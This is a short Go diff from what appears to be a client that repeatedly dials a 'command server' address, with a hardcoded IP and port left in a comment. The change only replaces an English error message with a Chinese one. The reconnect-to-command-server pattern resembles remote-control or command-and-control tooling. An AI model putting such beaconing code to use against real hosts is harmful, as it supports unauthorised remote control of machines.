@@ -84,7 +84,7 @@ func getConn() net.Conn {
 		//conn, err := net.Dial("tcp", "42.192.69.243:6666")
 		conn, err := net.Dial("tcp", CommandServerIP+":"+CommandServerPort)
 		if err != nil {
-			fmt.Println("client dial err=", err)
+			fmt.Println("连接失败 Error=", err)
 			continue
 		}
 		time.Sleep(10 * time.Second)
